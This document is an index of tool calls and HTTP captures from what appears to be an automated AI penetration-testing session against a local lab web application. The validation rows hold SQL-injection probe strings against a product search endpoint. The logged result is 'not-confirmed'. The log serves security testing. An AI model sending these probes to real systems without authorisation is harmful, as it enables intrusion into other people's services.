# lan-08 — chỉ mục tool-call history

Đọc từ `logs/session.jsonl`, đối chiếu đủ 82 lời gọi/82 kết quả với 145 messages của session JSON. Thời gian ngày 23/10/2026, UTC+07. Các lỗi được giải thích trong [báo cáo RCA](lan-08-audit.md). Đây là bản chỉ mục mới, không thay thế dữ liệu gốc.

| # | Iteration | Giờ | Seq call/result | Tool/action | Tham số chính | Status |
|---|---|---|---|---|---|---|
| 1 | 1 | 20:22:05.067 | 22/23 | `load_skill` | `{"name":"recon"}` | success |
| 2 | 1 | 20:22:05.118 | 25/26 | `permissions_status` | `{}` | success |
| 3 | 2 | 20:22:07.384 | 31/32 | `http` | `{"phase":"recon","method":"GET","url":"/","max_response_bytes":8192}` | observation |
| 4 | 3 | 20:22:09.141 | 37/38 | `http` | `{"method":"GET","max_response_bytes":4096,"phase":"recon","url":"/rest/products/search?q=apple"}` | observation |
| 5 | 4 | 20:22:14.333 | 84/85 | `file_write` | `{"path":"artifacts/recon/127-0-0-1-8081/summary.md","content_chars":2541}` | success |
| 6 | 5 | 20:22:15.738 | 90/91 | `service_discovery` | `{"target":"http://127.0.0.1:8081","ports":[8081],"timeout_seconds":20}` | observation |
| 7 | 6 | 20:22:17.560 | 96/97 | `workflow/complete_skill` | `{"skill_name":"recon","artifact_ref":"artifacts/recon/127-0-0-1-8081/summary.md","current_phase":"enumeration"}` | success |
| 8 | 7 | 20:22:19.487 | 113/114 | `load_skill` | `{"name":"web-enumeration"}` | success |
| 9 | 7 | 20:22:19.568 | 116/117 | `workflow/list` | `{"view":"endpoints","limit":25}` | success |
| 10 | 8 | 20:22:21.945 | 123/125 | `http` | `{"max_response_bytes":4096,"method":"GET","phase":"recon","url":"/robots.txt"}` | observation |
| 11 | 8 | 20:22:21.952 | 124/126 | `http` | `{"max_response_bytes":2048,"method":"GET","phase":"recon","url":"/sitemap.xml"}` | observation |
| 12 | 9 | 20:22:24.120 | 132/134 | `http` | `{"max_response_bytes":8192,"method":"GET","phase":"recon","url":"/ftp"}` | observation |
| 13 | 9 | 20:22:24.126 | 133/135 | `http` | `{"max_response_bytes":4096,"method":"GET","phase":"recon","url":"/api/Products"}` | observation |
| 14 | 10 | 20:22:26.584 | 141/143 | `http` | `{"max_response_bytes":8192,"method":"GET","phase":"recon","url":"/api/Products?q=apple"}` | observation |
| 15 | 10 | 20:22:26.591 | 142/144 | `http` | `{"max_response_bytes":4096,"method":"GET","phase":"recon","url":"/api/Products?name=apple"}` | observation |
| 16 | 11 | 20:22:29.227 | 176/177 | `workflow/record_input` | `{"endpoint":"/rest/products/search","method":"GET","parameter":"q","location":"query","input_type":"string","sample_payload":"apple"}` | success |
| 17 | 11 | 20:22:29.256 | 178/179 | `workflow/record_input` | `{"endpoint":"/api/Products","method":"GET","parameter":"q","location":"query","input_type":"string","sample_payload":"apple"}` | success |
| 18 | 12 | 20:22:31.815 | 196/199 | `http` | `{"max_response_bytes":8192,"method":"GET","phase":"recon","url":"/main.js"}` | observation |
| 19 | 12 | 20:22:31.828 | 197/198 | `http` | `{"max_response_bytes":8192,"method":"GET","phase":"recon","url":"/swagger.json"}` | observation |
| 20 | 13 | 20:22:34.496 | 248/251 | `http` | `{"max_response_bytes":6000,"method":"GET","phase":"recon","url":"/api-docs/"}` | observation |
| 21 | 13 | 20:22:34.507 | 249/250 | `http` | `{"max_response_bytes":4000,"method":"GET","phase":"recon","url":"/rest/user/login"}` | observation |
| 22 | 14 | 20:22:36.685 | 277/278 | `read_discovery_source` | `{"discovery_source_id":"ds_9646bef611e44f8ea9ff9f9e3d554c15","start_char":0,"max_chars":2000}` | error/invalid_args |
| 23 | 15 | 20:22:38.408 | 284/285 | `workflow/list` | `{"view":"sources","limit":20}` | success |
| 24 | 16 | 20:22:40.456 | 291/292 | `read_discovery_source` | `{"discovery_source_id":"ds_e41e53a43a53cc9fd1196952cfaa11434e0de8c27187bb5ea304aee415b70848","max_chars":2000,"start_char":2400}` | success |
| 25 | 17 | 20:22:42.344 | 298/299 | `http` | `{"max_response_bytes":16384,"method":"GET","phase":"recon","url":"/api-docs/swagger-ui-init.js"}` | observation |
| 26 | 18 | 20:22:43.923 | 327/328 | `workflow/list` | `{"limit":20,"view":"sources"}` | success |
| 27 | 19 | 20:22:46.111 | 334/336 | `read_discovery_source` | `{"discovery_source_id":"ds_1f5a02c19fcfa7bcd206c5b2c7a40fa2e95637e68ba7dc520a48d81d940c1217","max_chars":700,"start_char":0}` | success |
| 28 | 19 | 20:22:46.119 | 335/337 | `read_discovery_source` | `{"discovery_source_id":"ds_1f5a02c19fcfa7bcd206c5b2c7a40fa2e95637e68ba7dc520a48d81d940c1217","max_chars":1000,"start_char":700}` | success |
| 29 | 20 | 20:22:48.221 | 343/345 | `read_discovery_source` | `{"discovery_source_id":"ds_1f5a02c19fcfa7bcd206c5b2c7a40fa2e95637e68ba7dc520a48d81d940c1217","max_chars":800,"start_char":1700}` | success |
| 30 | 20 | 20:22:48.238 | 344/346 | `read_discovery_source` | `{"discovery_source_id":"ds_1f5a02c19fcfa7bcd206c5b2c7a40fa2e95637e68ba7dc520a48d81d940c1217","max_chars":700,"start_char":2500}` | success |
| 31 | 21 | 20:22:50.551 | 352/354 | `read_discovery_source` | `{"discovery_source_id":"ds_1f5a02c19fcfa7bcd206c5b2c7a40fa2e95637e68ba7dc520a48d81d940c1217","max_chars":800,"start_char":3200}` | success |
| 32 | 21 | 20:22:50.560 | 353/355 | `read_discovery_source` | `{"discovery_source_id":"ds_1f5a02c19fcfa7bcd206c5b2c7a40fa2e95637e68ba7dc520a48d81d940c1217","max_chars":700,"start_char":4000}` | success |
| 33 | 22 | 20:22:54.327 | 414/415 | `workflow/record_input` | `{"content_type":"application/json","endpoint":"/b2b/v2/orders","input_type":"string","location":"json","method":"POST","parameter":"cid","sample_payload":"{\"cid\":\"{INJECTION_POINT}\"}","source_attribution":{"discovery_source_id":"ds_1f5a02c19fcfa7bcd206c5b2c7a40fa2e95637e68ba7dc520a48d81d940c1217","document_location":"swaggerDoc.paths./orders.post.requestBody.content.application/json.schema.$ref -> components.schemas.Order.properties.cid","retained_hash":"2e2d5088ce57a032761db2fc5ec3a1426c8502f277b97824b892389acf65a6bc","retained_ref":"obs_6b852c553d104aa994c30eb1f93cf2c2"}}` | success |
| 34 | 22 | 20:22:54.364 | 416/417 | `workflow/record_input` | `{"content_type":"application/json","endpoint":"/b2b/v2/orders","input_type":"string","location":"json","method":"POST","parameter":"orderLinesData","sample_payload":"{\"orderLinesData\":\"[{&#34;productId&#34;:{INJECTION_POINT}}]\"}","source_attribution":{"discovery_source_id":"ds_1f5a02c19fcfa7bcd206c5b2c7a40fa2e95637e68ba7dc520a48d81d940c1217","document_location":"swaggerDoc.components.schemas.Order.properties.orderLinesData","retained_hash":"2e2d5088ce57a032761db2fc5ec3a1426c8502f277b97824b892389acf65a6bc","retained_ref":"obs_6b852c553d104aa994c30eb1f93cf2c2"}}` | success |
| 35 | 23 | 20:22:56.950 | 441/443 | `http` | `{"max_response_bytes":1024,"method":"GET","phase":"recon","url":"/.well-known/security.txt"}` | observation |
| 36 | 23 | 20:22:56.963 | 442/444 | `http` | `{"max_response_bytes":2048,"method":"POST","phase":"recon","url":"/rest/user/login","headers":{"Content-Type":"application/json"},"body":"{\"email\":\"nobody@example.invalid\",\"password\":\"[REDACTED]\"}"}` | observation |
| 37 | 24 | 20:22:59.998 | 476/477 | `workflow/record_input` | `{"baseline_request_ref":"obs_055d264c9cbd4ba89855c289d448b501","content_type":"application/json","endpoint":"/rest/user/login","input_type":"string","location":"json","method":"POST","parameter":"email","sample_payload":"{\"email\":\"{INJECTION_POINT}\",\"password\":\"[REDACTED]\"}","source_ref":"obs_055d264c9cbd4ba89855c289d448b501"}` | error/workflow_state |
| 38 | 24 | 20:23:00.031 | 478/479 | `workflow/record_input` | `{"content_type":"application/json","endpoint":"/rest/user/login","input_type":"string","location":"json","method":"POST","parameter":"password","sample_payload":"{\"email\":\"nobody@example.invalid\",\"password\":\"{INJECTION_POINT}\"}","source_ref":"obs_055d264c9cbd4ba89855c289d448b501"}` | success |
| 39 | 25 | 20:23:02.468 | 485/486 | `workflow/record_input` | `{"content_type":"application/json","endpoint":"/rest/user/login","input_type":"string","location":"json","method":"POST","parameter":"email","sample_payload":"{\"email\":\"{INJECTION_POINT}\",\"password\":\"[REDACTED]\"}","source_ref":"obs_055d264c9cbd4ba89855c289d448b501"}` | success |
| 40 | 26 | 20:23:05.865 | 513/514 | `content_discovery` | `{"base_url":"http://127.0.0.1:8081","max_requests":90,"rate_limit":10,"timeout_seconds":90,"paths":["/rest/products","/rest/products/search","/rest/user/whoami","/rest/basket/1","/rest/admin/application-configuration","/rest/user/authentication-details","/rest/languages","/rest/countries","/rest/feedbacks","/rest/products/reviews","/rest/memories","/api/Products","/api/Feedbacks","/api/SecurityQuestions","/api/Challenges","/api/Quantitys","/api/Users","/api/BasketItems","/api/Complaints","/api/Recycles","/b2b/v2/orders","/metrics","/api-docs/swagger-ui-init.js","/ftp/legal.md","/ftp/package.json.bak","/api/Products/1","/rest/user/change-password","/profile","/administration","/graphql"]}` | observation |
| 41 | 27 | 20:23:17.714 | 520/521 | `read_tool_result` | `{"result_ref":"tr_df10a47d276c443f9c40fc14a922bd05","start_char":5800,"max_chars":800}` | success |
| 42 | 28 | 20:23:19.559 | 527/528 | `read_tool_result` | `{"max_chars":1100,"result_ref":"tr_df10a47d276c443f9c40fc14a922bd05","start_char":4650}` | success |
| 43 | 29 | 20:23:35.217 | 546/547 | `file_write` | `{"path":"artifacts/web-enumeration/127-0-0-1-8081/inventory.md","content_chars":9870}` | success |
| 44 | 30 | 20:23:38.789 | 586/587 | `workflow/record_phase_coverage` | `{"coverage_dimension":"standard_metadata","coverage_status":"observed","phase":"enumeration"}` | success |
| 45 | 30 | 20:23:38.817 | 588/589 | `workflow/record_phase_coverage` | `{"coverage_dimension":"api_documentation","coverage_status":"observed","phase":"enumeration"}` | success |
| 46 | 31 | 20:23:41.829 | 595/596 | `workflow/record_phase_coverage` | `{"coverage_dimension":"javascript_endpoint_extraction","coverage_status":"observed","phase":"enumeration"}` | success |
| 47 | 31 | 20:23:41.856 | 597/598 | `workflow/record_phase_coverage` | `{"coverage_dimension":"browser_burp_capture","coverage_status":"not_applicable","phase":"enumeration"}` | success |
| 48 | 32 | 20:23:44.025 | 604/605 | `workflow/complete_skill` | `{"artifact_ref":"artifacts/web-enumeration/127-0-0-1-8081/inventory.md","current_phase":"analysis","skill_name":"web-enumeration"}` | success |
| 49 | 33 | 20:23:45.961 | 622/623 | `load_skill` | `{"name":"web-input-analysis"}` | success |
| 50 | 34 | 20:23:48.248 | 641/642 | `workflow/get_input` | `{"input_id":"input_ac9361062d60300bb65c"}` | success |
| 51 | 34 | 20:23:48.281 | 643/644 | `workflow/get_input` | `{"input_id":"input_99bef1c3b498eaba69e6"}` | success |
| 52 | 35 | 20:23:50.583 | 683/685 | `http` | `{"max_response_bytes":4096,"method":"GET","phase":"validation","url":"/rest/products/search?q=apple%27"}` | observation |
| 53 | 35 | 20:23:50.603 | 684/686 | `http` | `{"max_response_bytes":4096,"method":"GET","phase":"validation","url":"/api/Products?q=apple%27"}` | observation |
| 54 | 36 | 20:23:53.646 | 757/759 | `http` | `{"max_response_bytes":4096,"method":"GET","phase":"validation","url":"/rest/products/search?q=apple"}` | observation |
| 55 | 36 | 20:23:53.666 | 758/760 | `http` | `{"max_response_bytes":4096,"method":"GET","phase":"validation","url":"/api/Products?q=apple"}` | observation |
| 56 | 37 | 20:23:57.936 | 875/876 | `workflow/record_candidate` | `{"candidate_class":"sql-injection","current_phase":"analysis","endpoint":"/rest/products/search","input_id":"input_ac9361062d60300bb65c","location":"query","method":"GET","parameter":"q","priority":"high","request_template":"GET /rest/products/search?q={INJECTION_POINT}","source_skill":"web-input-analysis","status":"queued","test_case":"product-search-q-sqlite-error"}` | success |
| 57 | 38 | 20:24:02.165 | 915/916 | `workflow/set_input_disposition` | `{"disposition":"analyzed","input_id":"input_ac9361062d60300bb65c"}` | success |
| 58 | 38 | 20:24:02.213 | 917/918 | `workflow/set_input_disposition` | `{"disposition":"analyzed","input_id":"input_99bef1c3b498eaba69e6"}` | success |
| 59 | 39 | 20:24:06.675 | 936/937 | `workflow/set_input_disposition` | `{"disposition":"analyzed","input_id":"input_225b4d9ff3ca21177449"}` | success |
| 60 | 39 | 20:24:06.715 | 938/939 | `workflow/set_input_disposition` | `{"disposition":"analyzed","input_id":"input_c94cd762c2252a302ff2"}` | success |
| 61 | 40 | 20:24:10.369 | 945/946 | `workflow/set_input_disposition` | `{"disposition":"analyzed","input_id":"input_6d2e1ae0e466fb3776a6"}` | success |
| 62 | 40 | 20:24:10.407 | 947/948 | `workflow/set_input_disposition` | `{"disposition":"analyzed","input_id":"input_52b21fe0333ec61b4e71"}` | success |
| 63 | 41 | 20:24:21.953 | 967/968 | `file_write` | `{"path":"artifacts/web-input-analysis/127-0-0-1-8081/candidates.md","content_chars":6576}` | success |
| 64 | 42 | 20:24:24.438 | 974/975 | `workflow/complete_skill` | `{"artifact_ref":"artifacts/web-input-analysis/127-0-0-1-8081/candidates.md","current_phase":"validation","skill_name":"web-input-analysis"}` | success |
| 65 | 43 | 20:24:27.016 | 996/997 | `load_skill` | `{"name":"sql-injection"}` | success |
| 66 | 44 | 20:24:30.065 | 1004/1005 | `read_payloads` | `{"skill":"sql-injection","file":"payloads.txt","limit":120}` | success |
| 67 | 45 | 20:24:32.347 | 1011/1012 | `read_payloads` | `{"file":"payloads.txt","limit":70,"skill":"sql-injection","source_ref":"sf_af27bb3efbde41ed9aac70676e921abf","start_char":8234}` | success |
| 68 | 46 | 20:24:34.638 | 1061/1062 | `workflow/start_validation` | `{"candidate_id":"cand_dc84353ab8934993b033"}` | success |
| 69 | 47 | 20:24:37.783 | 1108/1109 | `http` | `{"max_response_bytes":4096,"method":"GET","phase":"validation","url":"/rest/products/search?q=apple"}` | observation |
| 70 | 48 | 20:24:40.787 | 1162/1163 | `http` | `{"max_response_bytes":4096,"method":"GET","phase":"validation","url":"/rest/products/search?q=apple%27%20AND%20%271%27%3D%271"}` | observation |
| 71 | 49 | 20:24:43.755 | 1193/1194 | `http` | `{"max_response_bytes":4096,"method":"GET","phase":"validation","url":"/rest/products/search?q=apple%27%20AND%20%271%27%3D%272"}` | observation |
| 72 | 50 | 20:24:47.858 | 1269/1271 | `http` | `{"max_response_bytes":4096,"method":"GET","phase":"validation","url":"/rest/products/search?q=apple%27%20AND%20%271%27%3D%271%20AND%20%271%27%3D%271"}` | observation |
| 73 | 50 | 20:24:47.883 | 1270/1272 | `http` | `{"max_response_bytes":4096,"method":"GET","phase":"validation","url":"/rest/products/search?q=%27%20AND%20%271%27%3D%272%20AND%20%27"}` | observation |
| 74 | 51 | 20:24:51.593 | 1343/1344 | `read_http_observation` | `{"observation_id":"obs_8fad4a2dfdce46948e2021c9a7b3d6e6","start_char":700,"max_chars":300}` | success |
| 75 | 52 | 20:24:54.445 | 1382/1383 | `http` | `{"max_response_bytes":4096,"method":"GET","phase":"validation","url":"/rest/products/search?q=apple%27--%20"}` | observation |
| 76 | 53 | 20:24:58.496 | 1478/1479 | `http` | `{"max_response_bytes":4096,"method":"GET","phase":"validation","url":"/rest/products/search?q=apple%27%2FCONCAT%28CHAR%2884%2C65%2C83%2C84%29%29%2F%27"}` | observation |
| 77 | 54 | 20:25:08.857 | 1548/1549 | `file_write` | `{"path":"artifacts/sql-injection/127-0-0-1-8081/cand_dc84353ab8934993b033-proof.md","content_chars":4563}` | success |
| 78 | 55 | 20:25:11.970 | 1555/1556 | `workflow/record_evidence` | `{"candidate_id":"cand_dc84353ab8934993b033","evidence_path":"artifacts/sql-injection/127-0-0-1-8081/cand_dc84353ab8934993b033-proof.md","observation_ids":["obs_8bbeb0c8568443688349af87498281b3","obs_286765a8a51c4a0d9e9c8f2e0ebe8b6f","obs_70f6f8bd5378439086d9d328f9c7a4ad","obs_9f6a41f2ab764e4e8dd0e1cb3f3e62ff","obs_8fad4a2dfdce46948e2021c9a7b3d6e6","obs_bd56416560044f70822e317ad0eb6b2d","obs_f78c247d5dd2458e90571a9de32ac50b"]}` | error/workflow_state |
| 79 | 56 | 20:25:15.341 | 1582/1583 | `workflow/list` | `{"candidate_id":"cand_dc84353ab8934993b033","limit":25}` | success |
| 80 | 57 | 20:25:19.731 | 1607/1608 | `file_edit` | `{"path":"artifacts/sql-injection/127-0-0-1-8081/cand_dc84353ab8934993b033-proof.md","repair":"Replace the three nonexistent observation IDs in the local proof with exact ledger IDs"}` | success |
| 81 | 58 | 20:25:22.689 | 1614/1615 | `workflow/record_evidence` | `{"candidate_id":"cand_dc84353ab8934993b033","evidence_path":"artifacts/sql-injection/127-0-0-1-8081/cand_dc84353ab8934993b033-proof.md","observation_ids":["obs_8bbeb0c8568443688349af87498281b3","obs_37b5c4549cbb414c95263930f502c815","obs_3953c680d581477786cd67ee211dae7f","obs_be08aba6d19c47198861d93be6ea2309","obs_8fad4a2dfdce46948e2021c9a7b3d6e6","obs_bd56416560044f70822e317ad0eb6b2d","obs_f78c247d5dd2458e90571a9de32ac50b"]}` | success |
| 82 | 59 | 20:25:30.485 | 1653/1654 | `workflow/record_result` | `{"attempt_id":"attempt_716a1aa80f7348aa87c7c3b8c8f4e920","candidate_id":"cand_dc84353ab8934993b033","skill_name":"sql-injection","outcome":"not-confirmed","observation_ids":["obs_8bbeb0c8568443688349af87498281b3","obs_37b5c4549cbb414c95263930f502c815","obs_3953c680d581477786cd67ee211dae7f","obs_be08aba6d19c47198861d93be6ea2309","obs_8fad4a2dfdce46948e2021c9a7b3d6e6","obs_bd56416560044f70822e317ad0eb6b2d","obs_f78c247d5dd2458e90571a9de32ac50b"],"evidence_refs":["ev_e7af19831b8818e931b2"],"techniques":["1b error-based syntax probe","2a boolean-based (TRUE/FALSE, inconclusive: equal sides)","error-based controlled expression (not evaluated)"],"repeatable":false,"mutation_performed":false,"cleanup_status":"No cleanup required: read-only GET requests; no server-reported write, no state change requested.","cleanup_state":"not-required"}` | success |

## Tất cả phản hồi HTTP

58 captures = 26 lời gọi `http` trực tiếp + 32 HTTP bên trong content discovery. HTTP 4xx/5xx là observations, không phải tool exception.

| Observation ID | Method/URL | HTTP | Retained bytes | Complete |
|---|---|---|---|---|
| `obs_9fb00a438b73404e8f0e309a04afcb8b` | `GET http://127.0.0.1:8081/` | 200 | 8192 | False |
| `obs_e42e3dbfe1d240a8b4039d85dc4cf924` | `GET http://127.0.0.1:8081/rest/products/search?q=apple` | 200 | 921 | True |
| `obs_e34285b367b34af2ad71fb49739feeb7` | `GET http://127.0.0.1:8081/robots.txt` | 200 | 28 | True |
| `obs_a3d42f5bf72b491b86c3b9ace4cca0f5` | `GET http://127.0.0.1:8081/sitemap.xml` | 200 | 2048 | False |
| `obs_c3aeac4e259645c7bd21f0968b3c7744` | `GET http://127.0.0.1:8081/ftp` | 200 | 8192 | False |
| `obs_182bc0169ce84336b2f65033e78f0bbf` | `GET http://127.0.0.1:8081/api/Products` | 200 | 4096 | False |
| `obs_b8f8d7c9006845c8ad94c6a5f945fee8` | `GET http://127.0.0.1:8081/api/Products?q=apple` | 200 | 885 | True |
| `obs_9970eb83b08c49efbe5d6bde4fa7f1be` | `GET http://127.0.0.1:8081/api/Products?name=apple` | 200 | 30 | True |
| `obs_8d3b442e5bbe45d3be2b16ba6c96db17` | `GET http://127.0.0.1:8081/swagger.json` | 200 | 8192 | False |
| `obs_72a89555a0374029816c0c83e3dedbd9` | `GET http://127.0.0.1:8081/main.js` | 200 | 8192 | False |
| `obs_562b6f168de6484d913d30a9d1523244` | `GET http://127.0.0.1:8081/rest/user/login` | 500 | 3014 | True |
| `obs_9646bef611e44f8ea9ff9f9e3d554c15` | `GET http://127.0.0.1:8081/api-docs/` | 200 | 3106 | True |
| `obs_6b852c553d104aa994c30eb1f93cf2c2` | `GET http://127.0.0.1:8081/api-docs/swagger-ui-init.js` | 200 | 5457 | True |
| `obs_11c4cd9eb0d246b7b3528ec61d0ea919` | `GET http://127.0.0.1:8081/.well-known/security.txt` | 200 | 475 | True |
| `obs_055d264c9cbd4ba89855c289d448b501` | `POST http://127.0.0.1:8081/rest/user/login` | 401 | 26 | True |
| `obs_dca5c56f45ae46e7967b670b17aac780` | `GET http://127.0.0.1:8081/.kagent-missing-89b0ffccca3b9302` | 200 | 9903 | True |
| `obs_4034a7a03a4945498eff5ad9723ea0d5` | `GET http://127.0.0.1:8081/.kagent-missing-a88958620b7c58db` | 200 | 9903 | True |
| `obs_38de9d5888cf4e738658dcac246ef783` | `GET http://127.0.0.1:8081/rest/products` | 500 | 3010 | True |
| `obs_829bf79fa7c04f35987f7420489e089a` | `GET http://127.0.0.1:8081/rest/products/search` | 200 | 16384 | False |
| `obs_3e5434eabba2407fac36fd2cfee3426e` | `GET http://127.0.0.1:8081/rest/user/whoami` | 200 | 11 | True |
| `obs_2ac20b23f23c42e1aeb2d50052851bf6` | `GET http://127.0.0.1:8081/rest/basket/1` | 401 | 972 | True |
| `obs_4eae7e41e7c84d54bc47badd697a52d5` | `GET http://127.0.0.1:8081/rest/admin/application-configuration` | 200 | 16384 | False |
| `obs_f8a31bf7cc3b4ac289704b6606dd9d02` | `GET http://127.0.0.1:8081/rest/user/authentication-details` | 401 | 972 | True |
| `obs_983478597b534ac9a633333c8d4f2b97` | `GET http://127.0.0.1:8081/rest/languages` | 200 | 4215 | True |
| `obs_beee139ba0144a3fb27ad7b49ac87c0b` | `GET http://127.0.0.1:8081/rest/countries` | 500 | 3012 | True |
| `obs_1e44a6ec6f46408abeb62bc6af0b5a6e` | `GET http://127.0.0.1:8081/rest/feedbacks` | 500 | 3012 | True |
| `obs_c497fa6be5764efbbcd2214f98bd0a3e` | `GET http://127.0.0.1:8081/rest/products/reviews` | 500 | 3026 | True |
| `obs_8a54c71592a24cf7ac3ef3027f9f0707` | `GET http://127.0.0.1:8081/rest/memories` | 200 | 6167 | True |
| `obs_7fe4179d4d934bdaa03403aad56800dc` | `GET http://127.0.0.1:8081/api/Products` | 200 | 16011 | True |
| `obs_3cd601d26ad043579ff89453a0fe32be` | `GET http://127.0.0.1:8081/api/Feedbacks` | 200 | 1734 | True |
| `obs_813f6917c32f4bae8c401399195f5300` | `GET http://127.0.0.1:8081/api/SecurityQuestions` | 200 | 1934 | True |
| `obs_09f9caef769c40b4b04c0f500384d3b4` | `GET http://127.0.0.1:8081/api/Challenges` | 200 | 16388 | False |
| `obs_8a458f58eea9401383f32a1b3c2301eb` | `GET http://127.0.0.1:8081/api/Quantitys` | 200 | 7628 | True |
| `obs_6075dece8ee9440795377146b1bbb6a3` | `GET http://127.0.0.1:8081/api/Users` | 401 | 972 | True |
| `obs_a54b22cc9a7e495a885886db5340e998` | `GET http://127.0.0.1:8081/api/BasketItems` | 401 | 972 | True |
| `obs_5c276dea94634a8683bf6340ff3abbf2` | `GET http://127.0.0.1:8081/api/Complaints` | 401 | 972 | True |
| `obs_cd032eb587ce4927a49de097551ad716` | `GET http://127.0.0.1:8081/api/Recycles` | 200 | 76 | True |
| `obs_76b95133af614aff888cb10275102943` | `GET http://127.0.0.1:8081/b2b/v2/orders` | 401 | 972 | True |
| `obs_bd4bdd38290846848ac6ab3cf2cf5167` | `GET http://127.0.0.1:8081/metrics` | 200 | 16384 | False |
| `obs_6d0da6ebaf704340843f3236bd5f0634` | `GET http://127.0.0.1:8081/api-docs/swagger-ui-init.js` | 200 | 5457 | True |
| `obs_ace39097ad4e46849b6939bec2fb3c92` | `GET http://127.0.0.1:8081/ftp/legal.md` | 200 | 3047 | True |
| `obs_33b66e36d82d430dac78736c28138614` | `GET http://127.0.0.1:8081/ftp/package.json.bak` | 403 | 1934 | True |
| `obs_b2170e8fc16047f08a6a02729d05328c` | `GET http://127.0.0.1:8081/api/Products/1` | 200 | 257 | True |
| `obs_5e7a7227070640828d3f27d058de25a5` | `GET http://127.0.0.1:8081/rest/user/change-password` | 401 | 25 | True |
| `obs_4dd8a9e27af84154a980a9cce8e89d63` | `GET http://127.0.0.1:8081/profile` | 500 | 1043 | True |
| `obs_ebc17c07bdef4ef09535fc35105f3314` | `GET http://127.0.0.1:8081/administration` | 200 | 9903 | True |
| `obs_11ebcf59840f436e85cb3e0114b109f4` | `GET http://127.0.0.1:8081/graphql` | 200 | 9903 | True |
| `obs_361146056883495089ff13eb2f4509d5` | `GET http://127.0.0.1:8081/rest/products/search?q=apple%27` | 500 | 994 | True |
| `obs_21ed82a77fcc4134b978e5a8254fb952` | `GET http://127.0.0.1:8081/api/Products?q=apple%27` | 200 | 30 | True |
| `obs_1487ecd5e81f448fa9f4d245a3a742f0` | `GET http://127.0.0.1:8081/rest/products/search?q=apple` | 200 | 921 | True |
| `obs_000f6ba751554c579eb2a59376f7f992` | `GET http://127.0.0.1:8081/api/Products?q=apple` | 200 | 885 | True |
| `obs_8bbeb0c8568443688349af87498281b3` | `GET http://127.0.0.1:8081/rest/products/search?q=apple` | 200 | 921 | True |
| `obs_37b5c4549cbb414c95263930f502c815` | `GET http://127.0.0.1:8081/rest/products/search?q=apple%27%20AND%20%271%27%3D%271` | 200 | 30 | True |
| `obs_3953c680d581477786cd67ee211dae7f` | `GET http://127.0.0.1:8081/rest/products/search?q=apple%27%20AND%20%271%27%3D%272` | 200 | 30 | True |
| `obs_be08aba6d19c47198861d93be6ea2309` | `GET http://127.0.0.1:8081/rest/products/search?q=apple%27%20AND%20%271%27%3D%271%20AND%20%271%27%3D%271` | 500 | 974 | True |
| `obs_8fad4a2dfdce46948e2021c9a7b3d6e6` | `GET http://127.0.0.1:8081/rest/products/search?q=%27%20AND%20%271%27%3D%272%20AND%20%27` | 500 | 974 | True |
| `obs_bd56416560044f70822e317ad0eb6b2d` | `GET http://127.0.0.1:8081/rest/products/search?q=apple%27--%20` | 500 | 942 | True |
| `obs_f78c247d5dd2458e90571a9de32ac50b` | `GET http://127.0.0.1:8081/rest/products/search?q=apple%27%2FCONCAT%28CHAR%2884%2C65%2C83%2C84%29%29%2F%27` | 200 | 30 | True |
